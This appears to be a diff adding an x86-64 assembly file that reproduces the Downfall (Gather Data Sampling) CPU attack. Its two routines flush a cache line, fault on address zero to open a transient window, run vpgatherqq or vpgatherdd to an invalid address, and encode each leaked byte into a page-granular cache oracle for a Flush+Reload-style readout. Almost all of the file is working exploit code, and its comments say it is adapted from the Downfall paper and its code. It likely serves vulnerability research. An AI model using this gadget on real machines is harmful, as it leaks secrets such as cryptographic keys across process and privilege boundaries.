@@ -1,0 +1,224 @@
+.data
+.align 0x1000
+    # Allocated for cache covert channel oracle
+    .global oracles 
+oracles:
+    .space 8*4096*256, 0
+    # Allocated for a dummy memory
+    .global address_buffer
+address_buffer:
+    .space 4096, 0
+
+.text
+# Extract the first QWORD from ymm4 and encode it to cache oracle
+.macro encode_ymm_qq
+    # Almost the same code as from Downfall
+    # Extract first QWORD from ymm4 into rax
+    vpextrq $0, %xmm4, %rax
+
+    # Copy the QWORD into 7 other registers 
+    mov %rax, %rbx
+    mov %rax, %rcx
+    mov %rax, %rdx
+    mov %rax, %r8
+    mov %rax, %r9
+    mov %rax, %r10
+    mov %rax, %r11
+    
+    # Load a cache line in based on the first byte 
+    # and so on for all other bytes
+    lea oracles+0*256*4096, %r13
+    shr $0, %rax
+    and $0xff, %rax
+    shlq $12, %rax
+    mov (%r13,%rax,1), %rax
+
+    lea oracles+1*256*4096, %r13
+    shr $8, %rbx
+    and $0xff, %rbx
+    shlq $12, %rbx
+    mov (%r13,%rbx,1), %rax
+
+    lea oracles+2*256*4096, %r13
+    shr $16, %rcx
+    and $0xff, %rcx
+    shlq $12, %rcx
+    mov (%r13,%rcx,1), %rax
+    
+    lea oracles+3*256*4096, %r13
+    shr $24, %rdx
+    and $0xff, %rdx
+    shlq $12, %rdx
+    mov (%r13,%rdx,1), %rax
+
+    lea oracles+4*256*4096, %r13
+    shr $32, %r8
+    and $0xff, %r8
+    shlq $12, %r8
+    mov (%r13,%r8,1), %rax
+
+    lea oracles+5*256*4096, %r13
+    shr $40, %r9
+    and $0xff, %r9
+    shlq $12, %r9
+    mov (%r13,%r9,1), %rax
+
+    lea oracles+6*256*4096, %r13
+    shr $48, %r10
+    and $0xff, %r10
+    shlq $12, %r10
+    mov (%r13,%r10,1), %rax
+
+    lea oracles+7*256*4096, %r13
+    shr $56, %r11
+    and $0xff, %r11
+    shlq $12, %r11
+    mov (%r13,%r11,1), %rax  
+.endm
+
+    .align 0x1000
+    .global s_load_encode_qq
+s_load_encode_qq:
+    # Performs the functionalty of listing 2
+    # from Downfall paper 
+    # Almost the same as from the Downfall code 
+
+    # Intutively Wipe out noisy values. 
+    .rept 32 # 32 was best before
+    inc %rax
+    vmovups (%rdi), %ymm3
+    .endr  
+
+    # Setup registers
+    # ymm1: index vector (zeros)
+    # ymm2: mask vector (ones)
+    # ymm3: output permutation vector (set by caller)
+    # ymm4: default output (zeros)
+    vpxor %ymm1, %ymm1, %ymm1
+    vpcmpeqb %ymm2, %ymm2, %ymm2
+    vmovups (%rdi), %ymm3
+    vpxor %ymm4, %ymm4, %ymm4
+    
+    # Step (i): Increase the transient window with cache miss and page fault
+    lea address_buffer, %rdi
+    clflush (%rdi)
+    mov (%rdi), %rax
+    xchg %rax, 0(%rdi)
+    mov $0, %rdi
+    mov (%rdi), %rax
+
+    # Step (ii): Gather to invalid memory address
+    mov $0, %r13
+    vpgatherqq %ymm2, 0(%r13, %ymm1, 1), %ymm4
+    
+    # Step (iii): Encode transient data to cache 
+    vpermq %ymm4, %ymm3, %ymm4
+    encode_ymm_qq
+    ret
+.text
+# Extract the first QWORD from ymm4 and encode it to cache oracle
+.macro encode_ymm_dd
+    # Almost the same code as from Downfall
+    # Extract first QWORD from ymm4 into rax
+    vpextrq $0, %xmm4, %rax
+
+    # Copy the QWORD into 7 other registers 
+    mov %rax, %rbx
+    mov %rax, %rcx
+    mov %rax, %rdx
+    mov %rax, %r8
+    mov %rax, %r9
+    mov %rax, %r10
+    mov %rax, %r11
+    
+    # Load a cache line in based on the first byte 
+    # and so on for all other bytes
+    lea oracles+0*256*4096, %r13
+    shr $0, %rax
+    and $0xff, %rax
+    shlq $12, %rax
+    mov (%r13,%rax,1), %rax
+
+    lea oracles+1*256*4096, %r13
+    shr $8, %rbx
+    and $0xff, %rbx
+    shlq $12, %rbx
+    mov (%r13,%rbx,1), %rax
+
+    lea oracles+2*256*4096, %r13
+    shr $16, %rcx
+    and $0xff, %rcx
+    shlq $12, %rcx
+    mov (%r13,%rcx,1), %rax
+    
+    lea oracles+3*256*4096, %r13
+    shr $24, %rdx
+    and $0xff, %rdx
+    shlq $12, %rdx
+    mov (%r13,%rdx,1), %rax
+
+    lea oracles+4*256*4096, %r13
+    shr $32, %r8
+    and $0xff, %r8
+    shlq $12, %r8
+    mov (%r13,%r8,1), %rax
+
+    lea oracles+5*256*4096, %r13
+    shr $40, %r9
+    and $0xff, %r9
+    shlq $12, %r9
+    mov (%r13,%r9,1), %rax
+
+    lea oracles+6*256*4096, %r13
+    shr $48, %r10
+    and $0xff, %r10
+    shlq $12, %r10
+    mov (%r13,%r10,1), %rax
+
+    lea oracles+7*256*4096, %r13
+    shr $56, %r11
+    and $0xff, %r11
+    shlq $12, %r11
+    mov (%r13,%r11,1), %rax  
+.endm
+
+    .align 0x1000
+    .global s_load_encode_dd
+s_load_encode_dd:
+    # Performs the functionalty of listing 2
+    # from Downfall paper 
+    # Almost the same as from the Downfall code 
+
+    # Intutively Wipe out noisy values. 
+    .rept 32 # 32 was best before
+    inc %rax
+    vmovups (%rdi), %ymm3
+    .endr  
+
+    # Setup registers
+    # ymm1: index vector (zeros)
+    # ymm2: mask vector (ones)
+    # ymm3: output permutation vector (set by caller)
+    # ymm4: default output (zeros)
+    vpxor %ymm1, %ymm1, %ymm1
+    vpcmpeqb %ymm2, %ymm2, %ymm2
+    vmovups (%rdi), %ymm3
+    vpxor %ymm4, %ymm4, %ymm4
+    
+    # Step (i): Increase the transient window with cache miss and page fault
+    lea address_buffer, %rdi
+    clflush (%rdi)
+    mov (%rdi), %rax
+    xchg %rax, 0(%rdi)
+    mov $0, %rdi
+    mov (%rdi), %rax
+
+    # Step (ii): Gather to invalid memory address
+    mov $0, %r13
+    vpgatherdd %ymm2, 0(%r13, %ymm1, 1), %ymm4
+    
+    # Step (iii): Encode transient data to cache 
+    vpermq %ymm4, %ymm3, %ymm4
+    encode_ymm_dd
+    ret
+
